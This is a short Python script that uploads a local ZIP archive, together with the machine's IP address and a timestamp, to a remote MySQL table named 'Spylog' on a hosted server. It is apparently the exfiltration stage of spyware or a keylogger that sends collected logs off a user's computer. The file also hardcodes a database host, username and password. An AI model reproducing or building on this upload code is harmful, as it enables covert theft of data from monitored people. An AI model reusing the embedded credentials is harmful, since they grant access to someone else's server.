import pymysql
from datetime import datetime
import socket

def addlog(db_config, zip_file_path):
      try:
        # Connect to MySQL
        conn = pymysql.connect(**db_config)
        cursor = conn.cursor()

        # Read ZIP file as binary
        with open(zip_file_path, 'rb') as file:
            binary_data = file.read()
        
        local_ip = socket.gethostbyname(socket.gethostname())
        # SQL Query to insert the file
        sql = "INSERT INTO Spylog(logdatetime,ipaddress,logdata) VALUES (%s , %s, %s)"
        cursor.execute(sql, (datetime.now(),local_ip ,binary_data))

        # Commit changes
        conn.commit()
        print(f"File '{zip_file_path}' inserted successfully.")

      except Exception as e:
        print(f"Error: {e}")
    
      finally:
         cursor.close()
         conn.close()

# Example usage
db_config = {
    "host": "srv1113.hstgr.io",
    "user": "u858168866_userlogs",
    "password": "mQ#7Oz7qQVVa",
    "database": "u858168866_logs"
}

addlog(db_config, "C:/Users/YOGESH/OneDrive/Desktop/data/log2.zip")
